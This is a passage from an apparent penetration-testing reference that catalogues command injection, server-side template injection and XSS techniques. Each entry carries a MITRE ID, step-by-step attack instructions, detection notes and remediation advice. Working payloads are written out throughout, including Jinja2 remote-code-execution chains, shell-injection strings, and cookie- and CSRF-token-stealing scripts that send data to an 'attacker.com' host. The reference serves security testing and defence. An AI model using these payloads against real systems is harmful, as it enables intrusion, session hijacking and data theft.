legal penetration test.
- **Detection**: Monitor logs for abnormal command patterns or shell errors, inspect input field behavior under test
- **Solution**: Always sanitize user input; use safe functions (e.g., subprocess with arrays instead of shell=True)
- **Tags**: OS Injection, Shell Injection, Web Exploit, RCE

## Command Injection via User-Controlled Parameters in Cron Jobs

- **Attack Type**: Command Injection in Scheduled Jobs
- **Target**: Linux servers, cron jobs
- **Vulnerability**: Unsanitized user input in cron commands
- **MITRE**: T1059 – Command Execution
- **Impact**: Full system compromise
- **Tools**: Cron, Linux shell, Burp Suite
- **Scenario**: Cron jobs scheduled with commands including unsanitized user parameters allow command injection.
- **Attack Steps**: Step 1: Identify cron jobs or scheduled tasks running system commands that include user input parameters (e.g., username, file path). Step 2: Confirm if these parameters are sanitized before being used in cron commands or shell scripts. Step 3: Inject payloads in parameters such as ; whoami or && id to break out of intended commands. Step 4: Wait for cron job execution and observe system logs or outputs for evidence of command injection. Step 5: If possible, modify parameters to execute arbitrary commands or reverse shells. Step 6: Use Burp Suite or curl to automate injection in parameters that trigger cron jobs. Step 7: Test various injection techniques to bypass input validation. Step 8: Document how injected commands run with cron privileges (often root). Step 9: Recommend securing cron job scripts by sanitizing inputs and avoiding direct shell calls with user input. Step 10: Suggest using safer scripting methods or parameter validation to prevent injection.
- **Detection**: Monitor cron logs, unexpected command execution
- **Solution**: Sanitize inputs; avoid shell command concatenation with user data; restrict cron privileges
- **Tags**: Cron Jobs, Command Injection

## Command Injection via Network Service Management Interfaces

- **Attack Type**: Command Injection via Network Interfaces
- **Target**: Network devices, servers
- **Vulnerability**: Unsanitized user input in management
- **MITRE**: T1059 – Command Execution
- **Impact**: Device takeover, network compromise
- **Tools**: Nmap, curl, Burp Suite
- **Scenario**: Network devices or services expose management interfaces taking user input used unsafely in system calls.
- **Attack Steps**: Step 1: Identify management interfaces (web UI, API, CLI) that accept commands or parameters from users. Step 2: Check if user input is passed directly to shell commands on the device (e.g., restarting services). Step 3: Inject payloads like ; ifconfig; or && netstat -an into input fields. Step 4: Observe responses or device behavior indicating command execution. Step 5: Attempt more complex commands to read device configs or create backdoors. Step 6: Use tools like Nmap or curl to automate and fuzz inputs. Step 7: Look for ways to escalate privileges or pivot internally. Step 8: Document exact input vectors and vulnerable parameters. Step 9: Recommend input validation, command whitelisting, and using safe APIs. Step 10: Advise restricting access to management interfaces with strong authentication and network controls.
- **Detection**: Monitor logs and unusual command execution
- **Solution**: Sanitize inputs; implement strict access controls and input validation
- **Tags**: Network Security, Command Injection

## Server-Side Template Injection Exploiting Jinja2 Template Rendering

- **Attack Type**: SSTI (Server-Side Template Injection)
- **Target**: Web apps using Jinja2
- **Vulnerability**: Unsafe template rendering
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution
- **Tools**: Burp Suite, Jinja2 templates
- **Scenario**: Jinja2 template engine rendering user input unsafely, allowing code execution.
- **Attack Steps**: Step 1: Identify input fields rendered using Jinja2 templates without proper escaping. Step 2: Inject simple payloads like {{7*7}} and observe if output is 49. Step 3: Inject advanced payloads to execute system commands: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Step 4: Confirm command output in response, proving code execution. Step 5: Attempt file reading commands like cat /etc/passwd. Step 6: Use Burp Suite Intruder to automate injections in multiple inputs. Step 7: Exploit to upload webshells or execute reverse shells if possible. Step 8: Document vulnerable endpoints and payloads used. Step 9: Recommend disabling eval-like features and escaping all user inputs. Step 10: Advise patching templates and using safe rendering options.
- **Detection**: Monitor logs for suspicious template usage
- **Solution**: Escape all inputs; disable unsafe eval; update Jinja2 to safe versions
- **Tags**: SSTI, Template Injection

## Server-Side Template Injection Exploiting Twig Template Injection in PHP

- **Attack Type**: SSTI in PHP Twig Templates
- **Target**: PHP web apps using Twig
- **Vulnerability**: Unsafe Twig template rendering
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution
- **Tools**: Burp Suite, Twig templates
- **Scenario**: Twig templates rendering unsanitized user input allowing code execution.
- **Attack Steps**: Step 1: Find input fields rendered in Twig templates without input sanitization. Step 2: Test injection by inputting {{7*7}} and verifying output is 49. Step 3: Inject payloads to run system commands, e.g., {{ constant('PHP_OS') }}, or {{ system('id') }}. Step 4: Observe if command output is visible in responses. Step 5: Inject payloads to read sensitive files or escalate access. Step 6: Use Burp Suite to automate payloads for multiple inputs. Step 7: Confirm ability to execute arbitrary PHP or OS commands via template injection. Step 8: Document all findings with vulnerable parameters and payloads. Step 9: Recommend escaping user input, disabling dangerous Twig functions, and updating Twig. Step 10: Suggest use of sandbox mode in Twig to restrict code execution.
- **Detection**: Monitor server logs for abnormal template usage
- **Solution**: Sanitize inputs; restrict Twig functions; use sandbox mode
- **Tags**: SSTI, Template Injection

## SSTI Exploiting ERB (Embedded Ruby) Templates

- **Attack Type**: Server-Side Template Injection
- **Target**: Ruby web apps
- **Vulnerability**: Unsafe code execution in ERB templates
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution
- **Tools**: Burp Suite, IRB, ERB templates
- **Scenario**: Ruby apps using ERB render templates unsafely allowing Ruby code execution via user input.
- **Attack Steps**: Step 1: Identify input fields rendered in ERB templates without proper escaping. Step 2: Test by injecting Ruby expressions such as <%= 7*7 %>. If output is 49, template rendering is unsanitized. Step 3: Inject more complex Ruby code, e.g., <%= whoami %> or <%= system('id') %>, to execute OS commands. Step 4: Observe output to confirm command execution. Step 5: Inject commands to read sensitive files (cat /etc/passwd) or escalate privileges. Step 6: Use Burp Suite Intruder to automate testing of multiple inputs and payloads. Step 7: Attempt to upload webshells or establish reverse shells using command execution. Step 8: Record vulnerable endpoints, inputs, and successful payloads. Step 9: Recommend escaping all user inputs, disabling unsafe ERB features, and patching frameworks. Step 10: Suggest use of safe templating engines or sandboxed Ruby execution environments to prevent SSTI.
- **Detection**: Monitor server logs for template errors or suspicious output
- **Solution**: Escape input, avoid eval in templates, update Ruby on Rails or ERB versions
- **Tags**: SSTI, Ruby, ERB

## SSTI Exploiting Handlebars Template Engine Prototype Pollution

- **Attack Type**: SSTI via Prototype Pollution
- **Target**: JavaScript web apps
- **Vulnerability**: Prototype pollution in Handlebars
- **MITRE**: T1221 – Template Injection
- **Impact**: Code execution, data theft
- **Tools**: Burp Suite, Node.js, Chrome DevTools
- **Scenario**: Handlebars templates in JavaScript apps vulnerable to prototype pollution leading to arbitrary code execution.
- **Attack Steps**: Step 1: Identify Handlebars templates rendering user input. Step 2: Find if application merges user input into object prototypes or context unsafely. Step 3: Inject payloads that modify __proto__ or constructor.prototype with malicious functions, e.g., {"__proto__": {"polluted": "yes"}}. Step 4: Trigger template rendering that uses polluted prototype properties leading to execution of injected code. Step 5: Use Burp Suite or Chrome DevTools to test and automate injection attempts. Step 6: Confirm if payload runs arbitrary JavaScript in server or client context. Step 7: Exploit to steal data, execute commands, or escalate privileges. Step 8: Document vulnerable inputs and explain attack chain. Step 9: Recommend deep input validation, use of safe Handlebars versions, and avoiding prototype pollution patterns. Step 10: Suggest using Object.freeze() and other JS defensive techniques to protect prototypes.
- **Detection**: Monitor template rendering errors and anomalies
- **Solution**: Sanitize inputs, freeze prototypes, update Handlebars
- **Tags**: SSTI, Handlebars, Prototype Pollution

## SSTI via Reflection or Arbitrary Method Calls in Templates

- **Attack Type**: SSTI via Reflection
- **Target**: Web apps with advanced templates
- **Vulnerability**: Reflection and arbitrary method calls
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Full remote code execution
- **Tools**: Burp Suite, Template engine tools
- **Scenario**: Templates that allow calling arbitrary methods or reflection based on user input, enabling code execution.
- **Attack Steps**: Step 1: Identify template engines (e.g., Jinja2, Twig, ERB) that allow reflection or method calls. Step 2: Inject payloads to call methods dynamically, e.g., {{ ''.__class__.__mro__[1].__subclasses__() }} in Jinja2. Step 3: Enumerate classes and methods to find exploitable ones like os.system. Step 4: Use these to run system commands via template injection, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 5: Observe output or server behavior changes proving code execution. Step 6: Use automated tools to explore method chains and test payloads systematically. Step 7: Attempt privilege escalation or persistent backdoors via commands. Step 8: Document vulnerable templates, input points, and payloads. Step 9: Recommend disabling reflective calls, sanitizing inputs, and patching template libraries. Step 10: Advise using safe rendering practices and sandbox environments for templates.
- **Detection**: Monitor logs and template errors
- **Solution**: Disable reflection in templates, sanitize inputs, update libraries
- **Tags**: SSTI, Reflection, Method Calls

## SSTI Leading to Remote Code Execution via Template Context

- **Attack Type**: SSTI leading to RCE
- **Target**: Web applications
- **Vulnerability**: Dangerous template context exposure
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution, data theft
- **Tools**: Burp Suite, Template debugging
- **Scenario**: Exploiting the template context to run arbitrary code remotely by accessing dangerous functions or objects.
- **Attack Steps**: Step 1: Identify template rendering contexts exposing sensitive objects (e.g., config, request, session). Step 2: Inject payloads to access these objects, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 3: Test if the server executes injected commands and returns output. Step 4: Use payloads to perform file reads, write files, or spawn shells. Step 5: Utilize Burp Suite Intruder to automate input testing. Step 6: Verify ability to persist access or escalate privileges. Step 7: Identify specific context properties that enable code execution. Step 8: Document the exploitation chain with all payloads and responses. Step 9: Recommend restricting template context, disabling access to sensitive objects, and sanitizing user input. Step 10: Suggest using template engines with safe default contexts or sandboxing.
- **Detection**: Monitor template output for suspicious commands
- **Solution**: Limit context exposure, sanitize inputs, update template engines
- **Tags**: SSTI, RCE, Template Context

## SSTI via Unsafe User Input in Template Variables

- **Attack Type**: Server-Side Template Injection
- **Target**: Web apps
- **Vulnerability**: Unsafe embedding of user input in templates
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution
- **Tools**: Burp Suite, Template engines
- **Scenario**: User inputs are directly embedded into template variables without sanitization, enabling SSTI attacks.
- **Attack Steps**: Step 1: Identify template inputs where user data is inserted directly into template variables. Step 2: Inject simple template payloads like {{7*7}} or ${7*7} depending on template syntax. Step 3: Observe output for evaluation of injected expressions (e.g., output 49 means unsanitized input). Step 4: Craft payloads to execute system commands, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }} in Jinja2. Step 5: Check if command output appears in response, confirming code execution. Step 6: Use Burp Suite Intruder to automate sending payloads to different inputs. Step 7: Attempt file reads or write actions to confirm exploitation depth. Step 8: Report all vulnerable inputs with tested payloads. Step 9: Recommend sanitizing all user inputs before embedding into templates. Step 10: Suggest updating and patching template libraries and using safe rendering functions.
- **Detection**: Monitor application logs for template errors or anomalies
- **Solution**: Sanitize inputs; use safe templating libraries; restrict user input allowed in templates
- **Tags**: SSTI, Unsafe Input, Template Injection

## SSTI in Multi-Tenant Template Engines with Shared Context

- **Attack Type**: SSTI via Shared Context
- **Target**: Multi-tenant web apps
- **Vulnerability**: Shared template context between tenants
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Multi-tenant data breach
- **Tools**: Burp Suite, Multi-tenant apps
- **Scenario**: Multi-tenant apps share template context allowing one tenant’s input to affect others, leading to SSTI.
- **Attack Steps**: Step 1: Identify multi-tenant app sharing template context across users or tenants. Step 2: Inject template payloads in one tenant’s input fields (e.g., {{7*7}}). Step 3: Check if output or behavior changes for other tenants or in shared views. Step 4: Inject advanced payloads to execute commands via shared context (e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}). Step 5: Verify if code execution affects multiple tenant contexts. Step 6: Use Burp Suite to automate testing multiple tenants’ inputs. Step 7: Document vulnerable template sharing mechanisms and affected tenants. Step 8: Recommend isolating template contexts per tenant strictly. Step 9: Suggest validating and sanitizing all tenant inputs separately. Step 10: Patch template engines to support sandboxed multi-tenant rendering.
- **Detection**: Monitor tenant logs for cross-tenant anomalies
- **Solution**: Isolate contexts per tenant; sanitize inputs; patch and configure template engines for multi-tenancy
- **Tags**: SSTI, Multi-Tenant, Shared Context

## SSTI with Dynamic Template Includes or Imports

- **Attack Type**: SSTI via Dynamic Template Loading
- **Target**: Web apps
- **Vulnerability**: Dynamic template includes/imports
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Arbitrary code execution
- **Tools**: Burp Suite, Template debuggers
- **Scenario**: Templates dynamically include or import other templates based on user input, enabling injection.
- **Attack Steps**: Step 1: Identify template features allowing dynamic includes/imports based on user input variables. Step 2: Inject payloads to control which templates get included, e.g., {{ include(user_input) }}. Step 3: Attempt to include malicious or crafted templates containing payloads like {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 4: Check if server executes included templates with malicious payloads. Step 5: Use Burp Suite to automate payload injection across various include paths. Step 6: Confirm arbitrary file inclusion or code execution via dynamic imports. Step 7: Attempt to escalate by reading sensitive files or uploading shells through included templates. Step 8: Document the vulnerable template include mechanisms and successful payloads. Step 9: Recommend disabling or restricting dynamic template includes or imports from user input. Step 10: Patch and configure template engines to limit dynamic template features and sanitize inputs.
- **Detection**: Monitor template includes and errors
- **Solution**: Disable dynamic includes from user input; sanitize paths; patch template engines
- **Tags**: SSTI, Dynamic Includes, Template Injection

## SSTI Using Debug Mode or Verbose Error Messages

- **Attack Type**: SSTI via Debug Mode Exposure
- **Target**: Web apps
- **Vulnerability**: Debug mode or verbose error exposure
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Information leakage, RCE
- **Tools**: Browser dev tools, Burp Suite
- **Scenario**: Debug mode or verbose errors reveal template rendering details, helping attackers craft SSTI payloads.
- **Attack Steps**: Step 1: Check if the application runs in debug or development mode showing detailed error messages. Step 2: Trigger template errors by injecting malformed template syntax (e.g., {{ invalid_code }}). Step 3: Analyze error responses revealing template engine internals or variable names. Step 4: Use discovered info to craft precise SSTI payloads targeting known template variables or functions. Step 5: Inject SSTI payloads to execute code, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 6: Observe outputs or behavior changes confirming remote code execution. Step 7: Automate with Burp Suite Intruder to test various payloads. Step 8: Document vulnerability caused by debug mode exposure. Step 9: Recommend disabling debug mode and verbose errors on production. Step 10: Suggest sanitizing inputs and patching template engines to handle errors safely.
- **Detection**: Monitor logs for debug mode usage or error floods
- **Solution**: Disable debug mode in production; sanitize inputs; patch template engines
- **Tags**: SSTI, Debug Mode, Error Messages

## Stored XSS via Persistent Database Injection

- **Attack Type**: Persistent XSS
- **Target**: Web applications
- **Vulnerability**: Stored script injection
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, data theft
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Malicious script is saved in the database and served to all users.
- **Attack Steps**: Step 1: Identify input fields that store data in the database (e.g., comments, profile info). Step 2: Inject script payload like <script>alert('XSS')</script> into these fields. Step 3: Submit input so it is saved persistently. Step 4: Visit pages or profiles that load the stored input and observe if the script executes (alert pops up). Step 5: Use Burp Suite to automate payload injection to multiple inputs. Step 6: Check impact by stealing cookies or session tokens using payloads like <script>fetch('http://attacker.com?cookie='+document.cookie)</script>. Step 7: Document vulnerable inputs and pages. Step 8: Recommend escaping output and sanitizing input. Step 9: Suggest Content Security Policy (CSP) to reduce damage. Step 10: Patch and update frameworks to prevent injection.
- **Detection**: Monitor logs and alerts for script injections
- **Solution**: Sanitize input; encode output; apply CSP; use frameworks with built-in XSS protections
- **Tags**: XSS, Stored, Persistent

## Reflected XSS via URL Query Parameters

- **Attack Type**: Reflected XSS
- **Target**: Web applications
- **Vulnerability**: Unsanitized URL parameter reflection
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, phishing
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Malicious script reflected immediately from URL parameters in response.
- **Attack Steps**: Step 1: Find URL parameters reflected in the page without encoding. Example: http://site.com/search?q=<script>alert(1)</script>. Step 2: Inject simple payloads like <script>alert(1)</script> in URL parameters. Step 3: Load the URL and check if the script executes immediately. Step 4: Test various inputs including event handlers (onerror=alert(1)) and encoded payloads. Step 5: Use Burp Suite to automate payload injection in multiple parameters. Step 6: Craft malicious URLs to trick victims into clicking. Step 7: Observe script execution on victim’s browser, stealing cookies or performing actions. Step 8: Report vulnerable parameters. Step 9: Recommend proper output encoding and input validation. Step 10: Suggest using frameworks that auto-escape reflected data.
- **Detection**: Detect unusual query strings or script execution attempts
- **Solution**: Encode output; validate input; avoid inline script insertion
- **Tags**: XSS, Reflected

## DOM-Based XSS via Unsafe JavaScript Manipulation

- **Attack Type**: DOM-Based XSS
- **Target**: Web applications
- **Vulnerability**: Unsafe DOM manipulation
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, data theft
- **Tools**: Browser Dev Tools, Burp Suite
- **Scenario**: Scripts modify the page DOM using unsafe user-controlled data, leading to XSS.
- **Attack Steps**: Step 1: Identify JavaScript code that reads user input from URL, cookies, or localStorage and inserts into DOM without sanitization. Step 2: Inject payloads in URL fragments or parameters like #<script>alert(1)</script>. Step 3: Load the page and observe if the script executes as DOM is updated. Step 4: Use browser dev tools to inspect where input is used in DOM. Step 5: Craft payloads that exploit DOM APIs (e.g., document.write(), innerHTML). Step 6: Test with different browsers and inputs. Step 7: Document vulnerable scripts and input sources. Step 8: Recommend sanitizing data before inserting into DOM and using safe DOM methods like textContent. Step 9: Suggest Content Security Policy (CSP). Step 10: Update JavaScript libraries or frameworks.
- **Detection**: Monitor script activity and DOM changes
- **Solution**: Sanitize DOM inputs; use safe DOM APIs; enforce CSP
- **Tags**: XSS, DOM-Based

## XSS via Unsafe HTML Attribute Injection

- **Attack Type**: HTML Attribute Injection
- **Target**: Web applications
- **Vulnerability**: Unsafe HTML attribute injection
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, phishing
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: User input inserted into HTML attributes without escaping, allowing JS injection.
- **Attack Steps**: Step 1: Identify user input placed inside HTML attributes (e.g., <img src="USER_INPUT">). Step 2: Inject payloads like " onerror="alert(1) to break out of the attribute context. Step 3: Load the page and check for alert popup or other script execution. Step 4: Test injection in various attributes like href, src, style, title. Step 5: Use Burp Suite to automate testing all attribute injection points. Step 6: Exploit to steal cookies or perform actions on behalf of user. Step 7: Document vulnerable attributes and inputs. Step 8: Recommend escaping all attribute values properly. Step 9: Suggest using templating engines that auto-escape attributes. Step 10: Patch frameworks and review template rendering code for unsafe practices.
- **Detection**: Detect injected attributes and unusual HTML in logs
- **Solution**: Escape attribute values; use safe templating engines
- **Tags**: XSS, HTML Attribute

## XSS via SVG or XML Embedded Scripts

- **Attack Type**: SVG/XML Script Injection
- **Target**: Web apps handling SVG/XML
- **Vulnerability**: Embedded scripts in SVG/XML files
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, phishing
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Malicious scripts embedded in SVG or XML files uploaded or embedded in pages, executing JS.
- **Attack Steps**: Step 1: Identify SVG or XML upload or embedding points. Step 2: Upload or inject SVG containing <script>alert(1)</script> inside SVG content. Step 3: Load the SVG or page referencing it and check if script runs. Step 4: Test XML external entities or inline event handlers in SVG/XML for injection. Step 5: Use Burp Suite to automate injection with encoded or obfuscated payloads. Step 6: Exploit for stealing tokens or conducting phishing attacks. Step 7: Document vulnerable upload or embed points. Step 8: Recommend sanitizing SVG/XML files before processing or rendering. Step 9: Disable inline scripts or event handlers in SVG. Step 10: Apply strict Content Security Policy (CSP) and validate uploaded file types.
- **Detection**: Scan uploaded files for scripts; monitor script execution attempts
- **Solution**: Sanitize SVG/XML; disable scripts; apply CSP; validate file uploads
- **Tags**: XSS, SVG, XML

## XSS via JavaScript Event Handler Injection

- **Attack Type**: Event Handler Injection
- **Target**: Web applications
- **Vulnerability**: Event handler injection in HTML
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Session hijacking, data theft
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: User input inserted into event attributes like onclick, onmouseover, enabling JavaScript execution.
- **Attack Steps**: Step 1: Identify inputs reflected inside HTML event handler attributes, e.g., <button onclick="USER_INPUT">Click</button>. Step 2: Inject payloads like alert('XSS') or more complex JS code to break out of the attribute context, e.g., ");alert('XSS');//. Step 3: Submit the input and visit the page to see if the injected JS executes when the event is triggered (click, hover, etc.). Step 4: Try different events like onmouseover, onfocus to trigger the payload. Step 5: Use Burp Suite to automate testing event handler injection points. Step 6: Use payloads that steal session cookies or perform actions (e.g., document.cookie theft). Step 7: Document vulnerable parameters and event attributes. Step 8: Suggest escaping user input properly and disallowing raw insertion in event handlers. Step 9: Recommend using CSP to block inline scripts and event handlers. Step 10: Patch application code or framework to sanitize event attributes safely.
- **Detection**: Monitor suspicious event handler injections
- **Solution**: Escape event handler attributes; disable inline JS; use CSP
- **Tags**: XSS, Event Handler Injection

## XSS for Session Cookie Theft using document.cookie

- **Attack Type**: Cookie Theft via XSS
- **Target**: Web applications
- **Vulnerability**: Access to document.cookie
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Account takeover, session hijacking
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Attacker injects script to steal victim’s session cookies by reading document.cookie and sending to attacker.
- **Attack Steps**: Step 1: Find XSS vulnerability where script injection is possible (stored, reflected, or DOM-based). Step 2: Inject payload like <script>fetch('http://attacker.com?cookie='+document.cookie)</script>. Step 3: When victim visits the page, the script runs and sends session cookie to attacker’s server. Step 4: Attacker monitors their server logs to capture cookies. Step 5: Use stolen cookie to impersonate victim’s session and access protected resources. Step 6: Use Burp Suite to automate injecting payloads and testing cookie theft. Step 7: Document vulnerable inputs allowing script injection. Step 8: Recommend HttpOnly cookies to prevent JavaScript access. Step 9: Suggest CSP to restrict script execution. Step 10: Sanitize all user inputs to prevent injection.
- **Detection**: Monitor outbound suspicious requests
- **Solution**: Use HttpOnly cookies; sanitize input; apply CSP
- **Tags**: XSS, Cookie Theft

## XSS for CSRF Token Theft and Bypass

- **Attack Type**: CSRF Token Theft via XSS
- **Target**: Web applications
- **Vulnerability**: CSRF token exposure via XSS
- **MITRE**: T1059.007 – Command Injection
- **Impact**: CSRF protection bypass, unauthorized actions
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Attacker steals CSRF tokens by injecting scripts that read token from page and send it to attacker.
- **Attack Steps**: Step 1: Identify XSS vulnerability that can run JS on victim’s page. Step 2: Inject payload to locate and read CSRF token from page, e.g., <script>fetch('http://attacker.com?token='+document.querySelector('input[name=csrf]').value)</script>. Step 3: Victim loads page; token is sent to attacker. Step 4: Attacker uses stolen token to craft valid CSRF requests, bypassing protection. Step 5: Test CSRF protection by sending forged requests with stolen tokens. Step 6: Use Burp Suite to automate token extraction and attack execution. Step 7: Document vulnerable inputs and token exposure points. Step 8: Recommend using double-submit cookies or SameSite cookies. Step 9: Suggest strict input validation and output encoding. Step 10: Implement robust CSRF protections that do not rely on tokens accessible via JavaScript.
- **Detection**: Monitor token leakage; detect unusual POST requests
- **Solution**: Use HttpOnly and SameSite cookies; sanitize inputs; avoid token exposure in JS
- **Tags**: XSS, CSRF Token Theft

## XSS via HTML5 PostMessage and Cross-Origin Messaging

- **Attack Type**: Cross-Origin Message Injection
- **Target**: Web applications
- **Vulnerability**: Lack of origin check in postMessage
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Data theft, session hijacking
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Malicious messages sent to page’s postMessage handler trigger script execution.
- **Attack Steps**: Step 1: Identify pages using window.postMessage to receive messages. Step 2: Find if origin checks are missing or weak in message event handlers. Step 3: Send crafted message from attacker-controlled domain containing malicious script or data that causes unsafe DOM updates or eval execution. Step 4: Victim’s browser processes malicious message, executing injected script. Step 5: Use Burp Suite or custom scripts to automate sending malicious postMessages. Step 6: Observe script execution or data theft on victim’s page. Step 7: Document vulnerable message handlers and lack of origin checks. Step 8: Recommend strict origin verification on message events. Step 9: Suggest sanitizing all message content before use. Step 10: Use secure frameworks that handle postMessage safely.
- **Detection**: Monitor postMessage event usage and origin validation failures
- **Solution**: Validate origin; sanitize message data; implement strict origin checks
- **Tags**: XSS, PostMessage Injection

## XSS via AngularJS or ReactJS Template Injection

- **Attack Type**: Template Injection in JS Frameworks
- **Target**: Web applications
- **Vulnerability**: Unsafe template rendering in JS libs
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Data theft, unauthorized actions
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: User inputs injected into AngularJS or React templates execute arbitrary code.
- **Attack Steps**: Step 1: Identify AngularJS or React apps where user input is rendered in templates without sanitization. Step 2: Inject payloads like {{7*7}} for AngularJS or JSX injections for React that execute JS code. Step 3: Load page and observe if code runs, e.g., expression evaluates or alert triggers. Step 4: Test common template injection payloads specific to the framework. Step 5: Use Burp Suite to automate testing injection points. Step 6: Exploit to steal data, bypass access controls, or execute commands. Step 7: Document vulnerable template bindings. Step 8: Recommend disabling dangerous template features or using safe rendering methods. Step 9: Suggest strict input sanitization and use of trusted libraries. Step 10: Keep frameworks updated to latest versions with security patches.
- **Detection**: Scan templates for unsafe bindings and input usage
- **Solution**: Sanitize inputs; disable dangerous bindings; update frameworks
- **Tags**: XSS, AngularJS, ReactJS

## Blind XSS via Out-of-Band Interaction (e.g., SSRF or Email)

- **Attack Type**: Blind XSS (Out-of-Band)
- **Target**: Web applications
- **Vulnerability**: Stored XSS with delayed execution
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Admin account compromise, data leakage
- **Tools**: Burp Suite, OWASP ZAP
- **Scenario**: Attacker injects payload that triggers later when viewed in an admin panel or email, causing hidden script execution.
- **Attack Steps**: Step 1: Find an input field (form, comment, profile) that stores data but does not immediately render it. Step 2: Inject a payload that will execute when the stored data is viewed by an admin or system later, e.g., <script src="http://attacker.com/evil.js"></script>. Step 3: The victim (admin or system) later opens the stored data (dashboard, email client, logs) causing the payload to execute in their browser. Step 4: The payload sends data or triggers SSRF requests back to attacker’s controlled server (out-of-band interaction). Step 5: Attacker monitors their server for incoming requests or stolen data triggered by the blind XSS. Step 6: Use tools like Burp Collaborator or OWASP ZAP to detect out-of-band callbacks. Step 7: Document the vulnerable input and out-of-band behavior. Step 8: Suggest sanitizing and encoding stored inputs and monitoring admin panels for unexpected requests. Step 9: Educate admins to use secure browsers or restrict script execution in admin views. Step 10: Fix input validation and output encoding throughout the application.
- **Detection**: Monitor unexpected network callbacks; review logs for suspicious requests
- **Solution**: Sanitize stored inputs; implement CSP; restrict admin panel scripting
- **Tags**: Blind XSS, Out-of-Band

## Mutation XSS Exploiting Browser DOM Parsing

- **Attack Type**: DOM-Based Mutation XSS
- **Target**: Web applications
- **Vulnerability**: DOM mutation during HTML parsing
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Script execution, data theft
- **Tools**: Browser Dev Tools, Burp
- **Scenario**: Browser modifies injected input via HTML parser quirks, resulting in unexpected JS execution.
- **Attack Steps**: Step 1: Identify input reflected into HTML where browser “fixes” or “mutates” broken tags or attributes. Step 2: Inject malformed HTML/JS payloads like <svg><script>alert(1)</script> that rely on browser DOM mutation. Step 3: Observe that browser corrects malformed markup, causing script to run unexpectedly. Step 4: Test in different browsers to understand mutation behavior. Step 5: Use Burp Suite to automate injection of mutation-prone payloads. Step 6: Document fields vulnerable to mutation XSS. Step 7: Explain to developers how browser DOM parsing can alter harmless input into executable script. Step 8: Suggest output encoding based on context (HTML, attribute, JavaScript). Step 9: Recommend testing in multiple browsers for DOM mutation vulnerabilities. Step 10: Patch to sanitize and encode user input before rendering.
- **Detection**: Monitor client-side scripts and logs for unexpected JS execution
- **Solution**: Apply context-aware output encoding; sanitize inputs; test across browsers
- **Tags**: Mutation XSS, DOM-based XSS

## XSS via Unsafe Use of innerHTML and eval()

- **Attack Type**: DOM-Based XSS via JS APIs
- **Target**: Web applications
- **Vulnerability**: Unsafe JS DOM APIs handling user input
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Script execution, session hijack
- **Tools**: Browser Dev Tools, Burp
- **Scenario**: User input inserted unsafely via innerHTML or eval() executes attacker’s script on client side.
- **Attack Steps**: Step 1: Identify JavaScript code that inserts user input using innerHTML or calls eval() on user data. Step 2: Inject payloads such as <img src=x onerror=alert(1)> or JS expressions for eval(). Step 3: Load the page and trigger JS functions inserting or evaluating the input. Step 4: Observe script execution due to unsafe DOM manipulation or eval. Step 5: Test with Burp Suite for automation. Step 6: Document vulnerable JS code handling user input. Step 7: Educate developers to avoid using innerHTML with unsanitized data and never use eval() on untrusted input. Step 8: Suggest replacing with safer DOM methods (textContent, createElement). Step 9: Recommend CSP to restrict inline JS execution. Step 10: Fix app code to sanitize or escape input before DOM insertion or evaluation.
- **Detection**: Monitor DOM API usage; detect suspicious JS eval calls
- **Solution**: Avoid innerHTML and eval; sanitize input; use safe DOM methods; apply CSP
- **Tags**: XSS, DOM XSS, JS Injection

## XSS via Content Security Policy (CSP) Bypass Techniques

- **Attack Type**: CSP Bypass XSS
- **Target**: Web applications
- **Vulnerability**: Weak CSP policies allowing unsafe scripts
- **MITRE**: T1059.007 – Command Injection
- **Impact**: Script execution despite CSP
- **Tools**: Browser Dev Tools, CSP Evaluators
- **Scenario**: Attackers bypass CSP policies using allowed unsafe directives or script gadgets to execute malicious JS.
